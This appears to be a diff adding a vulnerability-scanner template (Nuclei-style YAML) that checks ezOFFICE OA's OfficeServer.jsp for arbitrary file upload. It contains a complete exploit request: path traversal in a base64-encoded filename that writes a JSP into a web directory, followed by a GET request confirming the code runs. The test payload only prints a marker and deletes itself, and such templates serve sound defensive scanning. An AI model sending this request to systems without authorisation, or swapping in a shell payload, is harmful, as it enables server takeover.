@@ -1,0 +1,51 @@
+id: ezoffice-office-server-file-upload
+
+info:
+  name: ezOFFICE OA OfficeServer.jsp Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    ezOFFICE OA OfficeServer.jsp contains an arbitrary file upload vulnerability, allowing attackers to upload files and potentially control the server.
+  classification:
+    cvss-score: 9.0
+  tags: file-upload
+
+variables:
+  random_hex: "{{rand_base(6)}}"
+  encoded_filename: "{{base64(concat('//../../public/edit/', random_hex, '.jsp'))}}"
+  payload_content: |
+    <% out.println("{{random_hex}}");new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+
+http:
+  - raw:
+      - |
+        POST /defaultroot/public/iWebOfficeSign/OfficeServer.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        DBSTEP=REJTVEVQ\r\nOPTION=U0FWRUZJTEU=\r\nRECORDID=\r\nisDoc=dHJ1ZQ==\r\nmoduleType=Z292ZG9jdW1lbnQ=\r\nFILETYPE={{encoded_filename}}\r\n%-16sDBSTEP V3.0%-16s{{len(payload_content)}}%-16d0%-16s{{len(payload_content)}}{{payload_content}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "DBSTEP V3.0"
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        GET /defaultroot/public/edit/{{random_hex}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{random_hex}}"
+      - type: status
+        status:
+          - 200
